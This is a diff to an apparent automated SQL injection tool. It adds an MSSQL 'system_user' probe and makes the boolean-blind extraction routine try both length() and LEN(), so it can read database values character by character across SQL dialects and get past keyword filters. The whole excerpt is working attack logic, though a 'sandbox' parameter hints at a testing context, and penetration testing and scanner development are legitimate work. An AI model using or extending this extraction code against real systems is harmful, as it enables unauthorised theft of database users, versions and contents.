@@ -66,6 +66,7 @@ _VALUE_EXPRS = [
     ("session_user", "session_user"),
     ("current_db", "current_database()"),
     ("mssql_version", "@@version"),
+    ("mssql_user", "system_user"),
     ("oracle_banner", "(select banner from v$version where rownum=1)"),
 ]
 
@@ -181,11 +182,13 @@ def _boolean_blind(sandbox, t, and_pre, suf, headers) -> tuple[str | None, str]:
     # Try each candidate value; extract the first the target actually accepts (not filtered,
     # not null). This is what makes it robust to keyword filters and dialect differences.
     for label, expr in _VALUE_EXPRS:
-        if not truth(f"length(({expr}))>=1"):
+        # MSSQL has no length() (it is LEN); try both so extraction works across dialects
+        lenfn = next((lf for lf in ("length", "len") if truth(f"{lf}(({expr}))>=1")), None)
+        if lenfn is None:
             continue   # filtered out (malformed -> error) or null -> next candidate
         out = []
         for i in range(1, _MAXLEN + 1):
-            if not truth(f"length(({expr}))>={i}"):
+            if not truth(f"{lenfn}(({expr}))>={i}"):
                 break
             lo, hi = 32, 126
             while lo < hi:
